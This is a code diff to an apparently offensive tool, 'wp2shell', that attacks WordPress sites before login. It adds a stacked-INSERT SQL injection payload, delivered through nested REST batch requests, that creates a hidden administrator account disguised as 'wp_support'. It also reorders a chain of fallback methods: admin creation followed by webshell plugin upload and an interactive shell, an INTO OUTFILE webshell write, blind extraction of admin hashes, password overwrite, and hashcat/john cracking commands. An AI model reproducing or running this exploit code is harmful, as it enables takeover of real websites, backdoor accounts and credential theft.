@@ -704,22 +704,104 @@ class WP2Shell:
         log("Stacked query did not work (normal for mysqli)", "!")
         return False
 
+    def _sqli_create_admin(self, username, password, email=None):
+        """Create a new administrator user via stacked INSERT SQLi.
+
+        WordPress accepts raw MD5 hashes as a legacy fallback for
+        user_pass. Uses the same nested-batch delivery as
+        _sqli_update_password. Inserts both the user record and
+        administrator capabilities meta (wp_capabilities + wp_user_level).
+        """
+        log(f"Creating administrator '{username}' via stacked SQLi...")
+        if email is None:
+            email = f"{username}@{rand_string(6)}.com"
+
+        md5_hash = hashlib.md5(password.encode()).hexdigest()
+
+        # WordPress serialized capabilities array for administrator
+        caps = ("a:1:{s:13:\\\"administrator\\\";b:1;}")
+
+        sqli_value = (
+            f"SELECT 1;"
+            f"INSERT INTO {self.tp}users "
+            f"(user_login,user_pass,user_nicename,user_email,"
+            f"user_registered,user_status,display_name) VALUES "
+            f"('{username}','{md5_hash}','{username}','{email}',"
+            f"NOW(),0,'{username}');"
+            f"INSERT INTO {self.tp}usermeta "
+            f"(user_id,meta_key,meta_value) VALUES "
+            f"((SELECT ID FROM {self.tp}users "
+            f"WHERE user_login='{username}'),"
+            f"'{self.tp}capabilities','{caps}'),"
+            f"((SELECT ID FROM {self.tp}users "
+            f"WHERE user_login='{username}'),"
+            f"'{self.tp}user_level','10')"
+        )
+
+        inner_requests = [
+            {"method": "GET", "path": "http://:"},
+            {
+                "method": "GET",
+                "path": "/wp/v2/categories?" + urlencode({
+                    "author_exclude": sqli_value,
+                }),
+            },
+            {"method": "GET", "path": "/wp/v2/posts"},
+        ]
+        outer_batch = [
+            self._malformed(),
+            {
+                "method": "POST",
+                "path": "/wp/v2/posts",
+                "body": {"requests": inner_requests},
+            },
+            {"method": "POST", "path": "/batch/v1"},
+        ]
+        try:
+            self._batch(outer_batch, extra_timeout=10)
+        except Exception:
+            pass
+
+        log(f"Attempting login as '{username}'...")
+        if self._wp_login(username, password):
+            log(f"Administrator '{username}' created and authenticated", "+")
+            return True
+
+        log("Stacked INSERT failed (mysqli may not support multi_query)", "!")
+        return False
+
     # ========================================================================
     # Orchestration
     # ========================================================================
 
     def exploit(self, webroot="/var/www/html", shell_key=None,
-                admin_pass=None, skip_outfile=False):
-        """Full pre-auth RCE chain."""
+                admin_user=None, admin_pass=None, skip_outfile=False,
+                skip_create_admin=False):
+        """Full pre-auth RCE chain.
+
+        Tries the fastest RCE path first, falling back through
+        progressively slower methods:
+
+          3a  Stacked INSERT -> create admin -> login -> plugin upload
+              (fastest; no webroot needed, no blind extraction)
+          3b  SELECT INTO OUTFILE -> direct webshell write
+              (needs MySQL FILE priv + writable webroot)
+          3c  Blind extraction of existing admin + hash crack
+              (slow but works on any vulnerable instance)
+        """
         if shell_key is None:
             shell_key = rand_string(24)
+        if admin_user is None:
+            admin_user = "wp_support_" + rand_string(6)
         if admin_pass is None:
             admin_pass = "wp2shell_" + rand_string(12)
 
         print(BANNER)
-        log(f"Target:    {self.target}")
-        log(f"Batch URL: {self.batch_url}")
-        log(f"Shell key: {shell_key}")
+        log(f"Target:        {self.target}")
+        log(f"Batch URL:     {self.batch_url}")
+        log(f"Shell key:     {shell_key}")
+        log(f"Admin user:    {admin_user}")
+        log(f"Admin pass:    {admin_pass}")
         print()
 
         # -- Phase 1: Desync detection --
@@ -738,48 +820,65 @@ class WP2Shell:
             return False
         print()
 
-        # -- Phase 3a: OUTFILE (fastest) --
+        # -- Phase 3a: Create admin via stacked INSERT (fastest, no webroot) --
+        if not skip_create_admin:
+            log("Phase 3a: Create admin + login + plugin upload")
+            if self._sqli_create_admin(admin_user, admin_pass):
+                print()
+                self._upload_shell_plugin(shell_key)
+                if self.shell_url:
+                    self._interactive_shell()
+                    return True
+                return False
+            print()
+
+        # -- Phase 3b: OUTFILE (needs FILE priv + writable dir) --
         if not skip_outfile:
+            log("Phase 3b: Direct webshell via SELECT INTO OUTFILE")
             if self._try_outfile(webroot, shell_key):
                 print()
                 self._interactive_shell()
                 return True
             print()
 
-        # -- Phase 3b: Extract admin creds --
-        log("Extracting admin credentials via blind SQLi...")
+        # -- Phase 3c: Extract admin creds via blind SQLi --
+        log("Phase 3c: Extracting admin credentials via blind SQLi...")
         log("(This will take several minutes)")
         print()
-        admin_user, admin_hash = self._extract_admin_creds()
-        if not admin_user:
+        ext_user, ext_hash = self._extract_admin_creds()
+        if not ext_user:
             log("Failed to extract admin credentials", "-")
             return False
 
         print()
-        log(f"Admin user:  {admin_user}", "+")
-        log(f"Admin hash:  {admin_hash}", "+")
+        log(f"Existing admin user:  {ext_user}", "+")
+        log(f"Existing admin hash:  {ext_hash}", "+")
         print()
 
-        # -- Phase 3c: Try stacked UPDATE --
-        log(f"Setting admin password to: {admin_pass}")
-        if self._sqli_update_password(admin_user, admin_pass):
+        # -- Phase 3d: Try stacked UPDATE on existing admin --
+        log(f"Phase 3d: Updating existing admin password to: {admin_pass}")
+        if self._sqli_update_password(ext_user, admin_pass):
             log("Password updated!", "+")
             self._upload_shell_plugin(shell_key)
             if self.shell_url:
                 self._interactive_shell()
             return True
 
-        # -- Phase 3d: Offline crack instructions --
+        # -- Phase 3e: Offline crack instructions --
         print()
-        log("Direct password update failed. Crack the hash offline:", "!")
+        log("Phase 3e: Direct password update failed. "
+            "Crack the hash offline:", "!")
         print()
-        log(f"  echo '{admin_hash}' > hash.txt", ">")
+        log(f"  echo '{ext_hash}' > hash.txt", ">")
         log(f"  hashcat -m 400 hash.txt rockyou.txt", ">")
         log(f"  john --format=phpass hash.txt", ">")
         print()
         log("Then re-run:", "!")
         log(f"  python wp2shell.py {self.target} --shell "
-            f"--admin-user {admin_user} --admin-pass <cracked>", ">")
+            f"--admin-user {ext_user} --admin-pass <cracked>", ">")
+        log("Or re-run with the created admin credentials:", "!")
+        log(f"  python wp2shell.py {self.target} --shell "
+            f"--admin-user {admin_user} --admin-pass {admin_pass}", ">")
         return False
 
     def exploit_with_creds(self, username, password, shell_key=None):
@@ -952,11 +1051,16 @@ def main():
     parser.add_argument("--shell-key",
                         help="Webshell auth key (random if omitted)")
     parser.add_argument("--admin-user",
-                        help="Admin username (for --shell/--cleanup)")
+                        help="Admin username (for --exploit --shell "
+                             "--cleanup; random if omitted)")
     parser.add_argument("--admin-pass",
-                        help="Admin password (for --shell/--cleanup)")
+                        help="Admin password (for --exploit --shell "
+                             "--cleanup; random if omitted)")
     parser.add_argument("--skip-outfile", action="store_true",
                         help="Skip SELECT INTO OUTFILE attempt")
+    parser.add_argument("--no-create-admin", action="store_true",
+                        help="Skip stacked INSERT admin creation "
+                             "(fall through to OUTFILE / blind extraction)")
     parser.add_argument("--sleep", type=float, default=0.15,
                         help="SLEEP duration for blind SQLi (default: 0.15)")
     parser.add_argument("-v", "--verbose", action="store_true",
@@ -982,7 +1086,10 @@ def main():
         ok = wp.exploit(
             webroot=args.webroot,
             shell_key=args.shell_key,
+            admin_user=args.admin_user,
+            admin_pass=args.admin_pass,
             skip_outfile=args.skip_outfile,
+            skip_create_admin=args.no_create_admin,
         )
         sys.exit(0 if ok else 1)
 
